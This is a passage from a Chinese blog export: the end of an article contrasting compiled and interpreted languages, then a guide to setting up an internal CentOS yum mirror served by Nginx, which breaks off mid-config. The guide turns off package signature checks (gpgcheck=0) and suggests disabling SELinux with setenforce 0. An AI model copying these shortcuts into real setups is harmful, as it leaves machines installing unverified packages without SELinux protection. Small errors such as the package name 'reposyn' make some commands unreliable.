Language）：与动态类型语言刚好相反，它的数据类型检查发生在编译阶段，也就是说在写程序时要声明变量的数据类型。<br>C&#x2F;C++、C#、Java都是静态类型语言的典型代表，下面以C语言为例说明其原理：</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> hello[<span class=\"number\">20</span>] = <span class=\"string\">&quot;Hello world&quot;</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span> result[<span class=\"number\">20</span>] = hello / <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    print(result);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h2><h3 id=\"1-编译器和解释器的核心差异在于是否编译和执行过程是否是同时进行\"><a href=\"#1-编译器和解释器的核心差异在于是否编译和执行过程是否是同时进行\" class=\"headerlink\" title=\"1. 编译器和解释器的核心差异在于是否编译和执行过程是否是同时进行\"></a>1. 编译器和解释器的核心差异在于是否编译和执行过程是否是同时进行</h3><p>编译器所干的事，将一门语言 X 编译为另一门语言 Y （可以是语言 X、高级语言、低级语言等），整个编译过程涉及词法分析、语法分析、语义分析。该过程往往由程序员在编写程序时完成。<br>而解释器则直接将语言 X 编写的程序在目标机器上运行，并输出解释后运行的结果。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"center\">编译器 - Compiler</th>\n<th align=\"center\">解释器 - Interpreter</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">典型产品</td>\n<td align=\"center\">gcc、VC</td>\n<td align=\"center\">Basic，bash</td>\n</tr>\n<tr>\n<td align=\"center\">优化目标</td>\n<td align=\"center\">更快的运行速度</td>\n<td align=\"center\">更少的内存占用</td>\n</tr>\n<tr>\n<td align=\"center\">外部存储</td>\n<td align=\"center\">必须的</td>\n<td align=\"center\">可选的</td>\n</tr>\n<tr>\n<td align=\"center\">错误检查</td>\n<td align=\"center\">运行前的编译阶段</td>\n<td align=\"center\">程序运行过程中</td>\n</tr>\n<tr>\n<td align=\"center\">源代码</td>\n<td align=\"center\">直接运行二进制机器码</td>\n<td align=\"center\">运行环节必须依赖源代码</td>\n</tr>\n<tr>\n<td align=\"center\">运行环境</td>\n<td align=\"center\">操作系统提供的Runtime Library</td>\n<td align=\"center\">必须依赖于解释器</td>\n</tr>\n<tr>\n<td align=\"center\">跨平台支持</td>\n<td align=\"center\">维护不同版本的源代码，并需要编译环节</td>\n<td align=\"center\">通过解释器（或虚拟机）适配不同平台，源代码无需修改</td>\n</tr>\n<tr>\n<td align=\"center\">运行效率</td>\n<td align=\"center\">安装（编译）速度慢，运行速度快</td>\n<td align=\"center\">启动速度快，运行速度慢</td>\n</tr>\n</tbody></table>\n<h3 id=\"2-随着虚拟机技术的发展，越来越多的现代语言同时采用了编译技术和解释技术\"><a href=\"#2-随着虚拟机技术的发展，越来越多的现代语言同时采用了编译技术和解释技术\" class=\"headerlink\" title=\"2. 随着虚拟机技术的发展，越来越多的现代语言同时采用了编译技术和解释技术\"></a>2. 随着虚拟机技术的发展，越来越多的现代语言同时采用了编译技术和解释技术</h3><p>需要注意的是，随着计算机技术的发展，编译器的目标代码已经不仅是机器代码（Machine code），还可能是某种虚拟机（Viutual Machine）所支持的字节码（Bytecode），编译器和解释器正在不断地融合发展。</p>\n<p>以<code>Java</code>为例，就是同时使用了编译技术和解释技术，<code>JavaScript</code>也从客户端浏览器运行的脚本语言发展为高效复杂的V8引擎驱动。在智能终端方面，<code>Android</code>先后采用了<code>Dalvit</code>和<code>ART</code>等不同类型的编译器，华为更是基于方舟编译器推出了<code>Harmoney</code>操作系统。</p>\n<p>后续我们还将深入探讨编译技术的最新发展。</p>\n<h3 id=\"3-尽管存在争议，动态语言在开发效率的巨大优势使之成为现代高级语言的必然趋势\"><a href=\"#3-尽管存在争议，动态语言在开发效率的巨大优势使之成为现代高级语言的必然趋势\" class=\"headerlink\" title=\"3. 尽管存在争议，动态语言在开发效率的巨大优势使之成为现代高级语言的必然趋势\"></a>3. 尽管存在争议，动态语言在开发效率的巨大优势使之成为现代高级语言的必然趋势</h3><p>我们讨论了许多编程语言的类型安全问题，以下是一个粗糙的示意图，仅供参考。</p>\n<img src=\"/2021/10/31/%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%E5%92%8C%E8%A7%A3%E9%87%8A%E5%9E%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/type.jpg\" class=\"\">\n\n<p>可以肯定的是，动态语言对于Runtime环境的依赖越来越高，未来跨CPU平台的需求重要性也将越来越重要。</p>\n<hr>\n<h2 id=\"附录一：运行时库-Runtime-library\"><a href=\"#附录一：运行时库-Runtime-library\" class=\"headerlink\" title=\"附录一：运行时库 - Runtime library\"></a>附录一：运行时库 - Runtime library</h2><p>运行时库（<code>Runtime library</code>，又称运行时库），在计算机程序设计领域中，是指编程语言程序运行时（执行）所需要的一种特殊的计算机程序库，编译器会调用运行时库至已编译的可执行二进制代码中。这种库一般包括基本的输入输出或是内存管理等支持。它是一群支持正在运行程序的函数，与操作系统合作提供诸如数学运算、输入输出等功能，让程序写作者不需要“重新发明轮子”，并善用操作系统提供的功能。</p>\n<p>运行时库由编译器决定，以面向编程语言，提供其最基本的执行时需要。比如<code>Visual Basic</code>需要复杂的运行时库支持而<code>C</code>的运行时库则相对简单。当然这还是由编译器厂商决定的。运行时库中的函数可能对程序员透明，也可能不透明。这也是由编译器厂商对语言执行环境的需求而决定的。</p>\n<p>早期的运行期库（例如<code>Fortran</code>）提供了数学运算能力。其他语言增加了诸如垃圾回收的先进功能，用于支持对象数据结构。许多近代语言设计了更大的运行环境并添加更多功能。很多面向对象语言也包含了分派器与类别读取器。<code>Java</code>虚拟机（JVM）便是此类的典型运行环境：它也在运行期直译或编译具可携性的二进制<code>Java</code>程序。而<code>.NET</code>架构也是另外一个运行时库的实例。</p>\n<p>以<code>C</code>语言为例，其运行时库称为C Run-Time library，简称为<code>CRT</code>。<br>由于<code>C</code>语言其是所谓的<strong>小内核</strong>语言，就其语言本身来说很小（不多的关键字，程序流程控制，数据类型等）。所以，<code>C</code>语言内核开发出来之后，Dennis Ritchie 和 Brian Kernighan 就用<code>C</code>本身重写了 90% 以上的 UNIX 系统函数，并且把其中最常用的部分独立出来，形成头文件和对应的库文件，<code>C Run-Time library</code>（简称<code>CRT</code>）就是这样形成的。</p>\n<p><code>C run-time library</code>里面含有初始化代码，还有错误处理代码(例如divide by zero处理)。你写的程序可以没有<code>math</code>库，程序照样运行，只是不能处理复杂的数学运算，不过如果没有了<code>C run-time</code>库，<code>main()</code>就不会被调用，<code>exit()</code>也不能被响应。因为<code>C run-time library</code>包含了C程序运行的最基本和最常用的函数。</p>\n<p><code>CRT</code>和操作系统密切相关，从某种程度上来讲是，<code>CRT</code>是语言程序和不同操作系统平台之间的抽象层（接口是统一的标准，实现由各个平台自己实现）。</p>\n<h3 id=\"Linux：glibc（GNU-C-Library）\"><a href=\"#Linux：glibc（GNU-C-Library）\" class=\"headerlink\" title=\"Linux：glibc（GNU C Library）\"></a>Linux：<code>glibc</code>（GNU C Library）</h3><p>在Linux平台上最广泛使用的C运行库是<code>glibc</code>，其中包括C标准库的实现，也包括所有系统函数，并在其基础上增加了线程操作等扩展。<br>几乎所有C程序都要调用<code>glibc</code>的库函数，基本上除了Linux自身的API以外，所有的库都依赖于<code>glibc</code>，所以<code>glibc</code>是Linux平台C程序运行的基础。</p>\n<p><code>glibc</code>的动态库文件位于<code>/lib/libc.so.6</code>,静态库文件位于<code>/usr/lib/libc.a</code></p>\n<h3 id=\"Windows：MSVCRT（Microsoft-Visual-C-Run-time）\"><a href=\"#Windows：MSVCRT（Microsoft-Visual-C-Run-time）\" class=\"headerlink\" title=\"Windows：MSVCRT（Microsoft Visual C Run-time）\"></a>Windows：<code>MSVCRT</code>（Microsoft Visual C Run-time）</h3><p>在Windows环境下，<code>Visual C</code>提供的运行时库又分为动态运行时库和静态运行时库（注意：动态链接库或静态链接库与运行时库的分类角度不同，不得相提并论）。：</p>\n<ul>\n<li>动态运行时库：主要是DLL库文件<code>MSVCRT.DLL</code>(or MSVCRTD.DLL for debug build)，<br>对应的Import library文件是<code>MSVCRT.LIB</code>(MSVCRTD.LIB for debug build)</li>\n<li>静态运行时库：对应的主要文件是：<br><code>LIBC.LIB</code> (Single thread static library, retail version)<br><code>LIBCMT.LIB</code> (Multithread static library, retail version)</li>\n</ul>\n<h2 id=\"附录二：静态链接-Vs-动态链接\"><a href=\"#附录二：静态链接-Vs-动态链接\" class=\"headerlink\" title=\"附录二：静态链接 Vs 动态链接\"></a>附录二：静态链接 Vs 动态链接</h2><p>静态库是在链接阶段将汇编生成的目标文件<code>.o</code>与引用到的库一起链接打包到可执行文件中。因此对应的链接方式称为静态链接。试想一下，静态库与汇编生成的目标文件一起链接为可执行文件，那么静态库必定跟<code>.o</code>文件格式相似。其实一个静态库可以简单看成是一组目标文件（<code>.o</code>&#x2F;.obj文件）的集合，即很多目标文件经过压缩打包后形成的一个文件。</p>\n<p>在Linux环境下，静态库文件后缀是<code>.a</code>，Windows是<code>.lib</code>，其主要特点是：</p>\n<ul>\n<li>静态库对函数库的链接是放在<strong>编译期</strong>(Compile)完成的</li>\n<li>程序在运行时与函数库再无瓜葛，移植方便</li>\n<li>浪费空间和资源，因为所有相关的目标文件与牵涉到的函数库被链接合成一个可执行文件</li>\n</ul>\n<p>动态库在程序编译时并不会被连接到目标代码中，而是在程序运行是才被载入。不同的应用程序如果调用相同的库，那么在内存里只需要有一份该共享库的实例，规避了空间浪费问题。动态库在程序运行是才被载入，也解决了静态库对程序的更新、部署和发布页会带来麻烦。用户只需要更新动态库即可，增量更新。</p>\n<img src=\"/2021/10/31/%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%E5%92%8C%E8%A7%A3%E9%87%8A%E5%9E%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/dynamic.jpg\" class=\"\">\n\n<p>在Linux环境下，动态库文件后缀是<code>.so</code>，Windows是<code>.dll</code>，其主要特点是：</p>\n<ul>\n<li>动态库把对一些库函数的链接载入推迟到程序<strong>运行时</strong>（Runtime）的时期</li>\n<li>可以实现进程之间的资源共享，因此动态库也称为共享库</li>\n<li>将一些程序升级变得简单</li>\n<li>甚至可以真正做到链接载入完全由程序员在程序代码中控制（显式调用）</li>\n</ul>\n<h2 id=\"附录三：脚本语言-Scripting-language\"><a href=\"#附录三：脚本语言-Scripting-language\" class=\"headerlink\" title=\"附录三：脚本语言 - Scripting language\"></a>附录三：脚本语言 - Scripting language</h2><p>脚本语言（Scripting language）是让程序员快速完成程序的编写工作而创建的计算机编程语言，具有简单、易学、易用的特性。早期的脚本语言经常被称为批处理语言或作业控制语言。</p>\n<blockquote>\n<p>脚本语言与解释型语言并不是一个范畴的概念，但脚本代码通常是解释运行而非编译，开发脚本的目的就是快速连接多个软件组件。</p>\n</blockquote>\n<p>一些众所周知的例子：</p>\n<ul>\n<li>Lisp，最早的脚本语言，是一系列用于特定应用程序的通用语言和扩展语言，例如Emacs Lisp，用于Emacs编辑器</li>\n<li>Bash，一种用于Unix和类 Unix 操作系统和环境的解释性脚本语言。</li>\n<li>PowerShell，一种用于Microsoft Windows操作系统的脚本语言。</li>\n<li>sed和AWK，两种主要用于类 Unix 环境的文本处理语言。</li>\n<li>Perl，一种文本处理语言，后来发展成为一种通用语言，也用作各种应用程序的扩展语言。</li>\n<li>Python是一种通用脚本语言，也用作扩展语言。</li>\n<li>JavaScript（后来的：ECMAScript），最初是一种非常小的、高度特定于领域的语言，仅限于在 Web 浏览器中运行以动态修改正在显示的网页，后来发展成为一种广泛可移植的通用编程语言。</li>\n<li>Visual Basic for Applications，一种专用于Microsoft Office应用程序的扩展语言。</li>\n<li>Lua，一种设计用于一般应用程序的扩展语言的语言，并被许多不同的应用程序使用。</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"http://gcc.gnu.org/\">GCC的官方网站</a></li>\n<li><a href=\"https://llvm-tutorial-cn.readthedocs.io/en/latest/index.html\">用LLVM开发新语言</a></li>\n<li><a href=\"https://www.ruanyifeng.com/blog/2018/01/assembly-language-primer.html\">汇编语言入门教程 - 阮一峰</a></li>\n<li><a href=\"https://blog.csdn.net/qq_36287943/article/details/103601371\">GCC简单编译流程</a></li>\n<li><a href=\"https://hltj.me/lang/2017/08/01/modern-lang-static-type.html\">现代编程语言系列1：静态类型趋势</a></li>\n<li><a href=\"https://www.zhihu.com/question/19918532\">讨论帖 - 弱类型、强类型、动态类型、静态类型语言的区别是什么？</a></li>\n</ul>\n"},{"title":"自建yum软件源的安装记录","url":"/2020/09/02/%E8%87%AA%E5%BB%BAyum%E8%BD%AF%E4%BB%B6%E6%BA%90%E7%9A%84%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/","content":"<h2 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h2><p>基于Centos 7.8的基线版本，同步yum软件源，为客户端提供内网下载服务<br>Server采用Nginx提供下载服务，默认采用http方式</p>\n<h2 id=\"Sever的安装步骤\"><a href=\"#Sever的安装步骤\" class=\"headerlink\" title=\"Sever的安装步骤\"></a>Sever的安装步骤</h2><h3 id=\"1-准备工作\"><a href=\"#1-准备工作\" class=\"headerlink\" title=\"1. 准备工作\"></a>1. 准备工作</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装必须的基础软件</span></span><br><span class=\"line\">yum install -y yum-utils reposyn createrepo</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 删除所有系统自带的REPO源</span></span><br><span class=\"line\"><span class=\"built_in\">rm</span> -f /etc/yum.repos.d/*.repo</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-创建自定义的REPO源\"><a href=\"#2-创建自定义的REPO源\" class=\"headerlink\" title=\"2. 创建自定义的REPO源\"></a>2. 创建自定义的REPO源</h3><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置REPO软件源，注意 $ 前面的转义符！</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/yum.repos.d/Source-CentOS.repo &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\"># CentOS-Base.repo</span></span><br><span class=\"line\"><span class=\"string\">#</span></span><br><span class=\"line\"><span class=\"string\"># Yum Repo Source for Centos 7.8 baseline</span></span><br><span class=\"line\"><span class=\"string\"># Create by sj0225@icloud.com</span></span><br><span class=\"line\"><span class=\"string\">#</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[base]</span></span><br><span class=\"line\"><span class=\"string\">name=CentOS-\\$releasever - Base</span></span><br><span class=\"line\"><span class=\"string\">baseurl=https://mirrors.huaweicloud.com/centos/\\$releasever/os/\\$basearch/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#released updates</span></span><br><span class=\"line\"><span class=\"string\">[updates]</span></span><br><span class=\"line\"><span class=\"string\">name=CentOS-\\$releasever - Updates</span></span><br><span class=\"line\"><span class=\"string\">baseurl=https://mirrors.huaweicloud.com/centos/\\$releasever/updates/\\$basearch/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#additional packages that may be useful</span></span><br><span class=\"line\"><span class=\"string\">[extras]</span></span><br><span class=\"line\"><span class=\"string\">name=CentOS-\\$releasever - Extras</span></span><br><span class=\"line\"><span class=\"string\">baseurl=https://mirrors.huaweicloud.com/centos/\\$releasever/extras/\\$basearch/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#additional packages that extend functionality of existing packages</span></span><br><span class=\"line\"><span class=\"string\">[centosplus]</span></span><br><span class=\"line\"><span class=\"string\">name=CentOS-\\$releasever - Plus</span></span><br><span class=\"line\"><span class=\"string\">baseurl=https://mirrors.huaweicloud.com/centos/\\$releasever/centosplus/\\$basearch/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/yum.repos.d/Source-Docker-CE.repo &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">[docker-ce]</span></span><br><span class=\"line\"><span class=\"string\">name=Docker CE Stable - \\$basearch</span></span><br><span class=\"line\"><span class=\"string\">baseurl=https://mirrors.huaweicloud.com/docker-ce/linux/centos/\\$releasever/\\$basearch/stable/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/yum.repos.d/Source-EPEL.repo &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">[epel]</span></span><br><span class=\"line\"><span class=\"string\">name=Extra Packages for Enterprise Linux 7 - \\$basearch</span></span><br><span class=\"line\"><span class=\"string\">baseurl=https://mirrors.huaweicloud.com/epel/\\$releasever/\\$basearch</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/yum.repos.d/Source-Kubernetes.repo &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">[kubernetes]</span></span><br><span class=\"line\"><span class=\"string\">name=kubernetes - el7-x86_64</span></span><br><span class=\"line\"><span class=\"string\">baseurl=https://mirrors.cloud.tencent.com/kubernetes/yum/repos/kubernetes-el7-x86_64/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>目前定义了四个REPO文件，分别是：</p>\n<ul>\n<li><code>Source-CentOS.repo</code>： Cenots的官方软件，包含base、updates、extras、centosplus四个子项，来自华为云</li>\n<li><code>Source-EPEL.repo</code>: Redhat维护的常用软件源，来自华为云</li>\n<li><code>Source-Docker-CE.repo</code>: Docker开源社区版，来自华为云</li>\n<li><code>Source-Kubernetes.repo</code>: Google提供的Kubernetes安装包，来自腾讯云（华为云的目录结构无法顺利同步！）</li>\n</ul>\n<blockquote>\n<p>Kubernetes依赖于Linux内核版本，目前用的是<code>e17-x86-64</code></p>\n</blockquote>\n<h3 id=\"3-从外网获取REPO源包含的rpm软件包\"><a href=\"#3-从外网获取REPO源包含的rpm软件包\" class=\"headerlink\" title=\"3. 从外网获取REPO源包含的rpm软件包\"></a>3. 从外网获取REPO源包含的rpm软件包</h3><p>通过reposyn获取REPO源的rpm安装包，并存放在<code>/data/</code>目录下，目前数据量约为37G</p>\n<blockquote>\n<p>简便起见，目前没有启用GPG校验功能！</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 清理yum缓存</span></span><br><span class=\"line\">yum clean all</span><br><span class=\"line\">yum makecache</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 从外网下载rpm安装包</span></span><br><span class=\"line\">reposync -r base -p /data/centos</span><br><span class=\"line\">reposync -r extras -p /data/centos</span><br><span class=\"line\">reposync -r updates -p /data/centos</span><br><span class=\"line\">reposync -r centosplus -p /data/centos</span><br><span class=\"line\"></span><br><span class=\"line\">reposync -r epel -p /data</span><br><span class=\"line\">reposync -r docker-ce -p /data</span><br><span class=\"line\">reposync -r kubernetes -p /data</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-创建或更新REPO索引\"><a href=\"#4-创建或更新REPO索引\" class=\"headerlink\" title=\"4. 创建或更新REPO索引\"></a>4. 创建或更新REPO索引</h3><p>创建并执行一个更新索引文件的脚本，位于<code>/root/repo-sync.sh</code>（以后还将用于crontab定时任务更新）。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">###参数-n指下载最新软件包，-p指定目录，指定本地的源--repoid（如果不指定就同步本地服务器所有的源）,下载过程比较久</span></span><br><span class=\"line\">/usr/bin/reposync -n --repoid=extras --repoid=updates --repoid=base --repoid=centosplus -p /data/centos</span><br><span class=\"line\">/usr/bin/reposync -n --repoid=epel -p /data</span><br><span class=\"line\">/usr/bin/reposync -n --repoid=docker-ce -p /data</span><br><span class=\"line\">/usr/bin/reposync -n --repoid=kubernetes -p /data</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/bin/createrepo --update /data/centos/base --worker 4</span><br><span class=\"line\">/usr/bin/createrepo --update /data/centos/extras --worker 4</span><br><span class=\"line\">/usr/bin/createrepo --update /data/centos/updates --worker 4</span><br><span class=\"line\">/usr/bin/createrepo --update /data/centos/centosplus --worker 4</span><br><span class=\"line\">/usr/bin/createrepo --update /data/epel --worker 4</span><br><span class=\"line\">/usr/bin/createrepo --update /data/docker-ce --worker 4</span><br><span class=\"line\">/usr/bin/createrepo --update /data/kubernetes --worker 4</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-设置HTTP文件下载服务\"><a href=\"#5-设置HTTP文件下载服务\" class=\"headerlink\" title=\"5. 设置HTTP文件下载服务\"></a>5. 设置HTTP文件下载服务</h3><p>推荐采用Nginx提供http文件下载服务</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install nginx -y</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/nginx/nginx.conf &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">user nginx;</span></span><br><span class=\"line\"><span class=\"string\">worker_processes auto;</span></span><br><span class=\"line\"><span class=\"string\">error_log /var/log/nginx/error.log;</span></span><br><span class=\"line\"><span class=\"string\">pid /run/nginx.pid;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">include /usr/share/nginx/modules/*.conf;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">events &#123;</span></span><br><span class=\"line\"><span class=\"string\">    worker_connections 1024;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">http &#123;</span></span><br><span class=\"line\"><span class=\"string\">    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span></span><br><span class=\"line\"><span class=\"string\">                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span></span><br><span class=\"line\"><span class=\"string\">                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    access_log  /var/log/nginx/access.log  main;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    sendfile            on;</span></span><br><span class=\"line\"><span class=\"string\">    tcp_nopush          on;</span></span><br><span class=\"line\"><span class=\"string\">    tcp_nodelay         on;</span></span><br><span class=\"line\"><span class=\"string\">    keepalive_timeout   65;</span></span><br><span class=\"line\"><span class=\"string\">    types_hash_max_size 2048;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    include             /etc/nginx/mime.types;</span></span><br><span class=\"line\"><span class=\"string\">    default_type        application/octet-stream;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    server &#123;</span></span><br><span class=\"line\"><span class=\"string\">        listen 80;</span></span><br><span class=\"line\"><span class=\"string\">        server_name localhost;</span></span><br><span class=\"line\"><span class=\"string\">        charset utf-8;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        location / &#123;</span></span><br><span class=\"line\"><span class=\"string\">            root /data;</span></span><br><span class=\"line\"><span class=\"string\">            autoindex on;</span></span><br><span class=\"line\"><span class=\"string\">            autoindex_exact_size off;</span></span><br><span class=\"line\"><span class=\"string\">            autoindex_localtime on;</span></span><br><span class=\"line\"><span class=\"string\">        &#125;</span></span><br><span class=\"line\"><span class=\"string\">    &#125;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> nginx</span><br><span class=\"line\">systemctl start nginx</span><br><span class=\"line\">systemctl status nginx</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-测试检查工作\"><a href=\"#6-测试检查工作\" class=\"headerlink\" title=\"6. 测试检查工作\"></a>6. 测试检查工作</h3><p>安装完成，现在浏览器打开Server的IP地址，就可以看到软件源的目录结构，并可以提供给Client使用了。</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">/data</span><br><span class=\"line\">├── centos</span><br><span class=\"line\">│   ├── base</span><br><span class=\"line\">│   │   ├── Packages</span><br><span class=\"line\">│   │   └── repodata</span><br><span class=\"line\">│   ├── centosplus</span><br><span class=\"line\">│   │   ├── Packages</span><br><span class=\"line\">│   │   └── repodata</span><br><span class=\"line\">│   ├── extras</span><br><span class=\"line\">│   │   ├── Packages</span><br><span class=\"line\">│   │   └── repodata</span><br><span class=\"line\">│   └── updates</span><br><span class=\"line\">│       ├── Packages</span><br><span class=\"line\">│       └── repodata</span><br><span class=\"line\">├── docker-ce</span><br><span class=\"line\">│   ├── Packages</span><br><span class=\"line\">│   └── repodata</span><br><span class=\"line\">├── epel</span><br><span class=\"line\">│   ├── Packages</span><br><span class=\"line\">│   │   ├── 0</span><br><span class=\"line\">│   │   ├── 2</span><br><span class=\"line\">│   │   ├── 3</span><br><span class=\"line\">......</span><br><span class=\"line\">│   │   ├── y</span><br><span class=\"line\">│   │   └── z</span><br><span class=\"line\">│   └── repodata</span><br><span class=\"line\">└── kubernetes</span><br><span class=\"line\">    ├── Packages</span><br><span class=\"line\">    └── repodata</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>Nginx服务如果网络端口或目录权限等问题导致不能正常启动，往往是SELinux在搞鬼，可以通过<code>setenforce 0</code>强制关闭</p>\n</blockquote>\n<h3 id=\"7-设置定时更新任务\"><a href=\"#7-设置定时更新任务\" class=\"headerlink\" title=\"7. 设置定时更新任务\"></a>7. 设置定时更新任务</h3><p>如果一切检查顺利，最后根据位于<code>/root/repo-sync.sh</code>，追加到crontab定时任务更新。</p>\n<h2 id=\"Client的使用方法\"><a href=\"#Client的使用方法\" class=\"headerlink\" title=\"Client的使用方法\"></a>Client的使用方法</h2><p>要在内网使用自建YUM源就很简单了。</p>\n<p>首先，确认<code>mirrror.caogo.local</code>的域名能够被准确解析。<br>然后，在目录<code>/etc/yum.repos.d/</code>设置自定义的REPO源就OK了。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">rm</span> -f /etc/yum.repos.d/*.repo</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/yum.repos.d/Caogo-CentOS.repo &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\"># CentOS-Base.repo</span></span><br><span class=\"line\"><span class=\"string\">#</span></span><br><span class=\"line\"><span class=\"string\"># Yum Repo Source for Centos 7.8 baseline</span></span><br><span class=\"line\"><span class=\"string\"># Created by sj0225@icloud.com</span></span><br><span class=\"line\"><span class=\"string\">#</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[base]</span></span><br><span class=\"line\"><span class=\"string\">name=CentOS - Base</span></span><br><span class=\"line\"><span class=\"string\">baseurl=http://mirror.caogo.local/centos/base/</span></span><br><span class=\"line\"><span class=\"string\">enabled=1</span></span><br><span class=\"line\"><span class=\"string\">gpgcheck=0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#released updates</span></span><br><span class=\"line\"><span class=\"string\">[updates]</span></span><br><span class=\"line\"><span 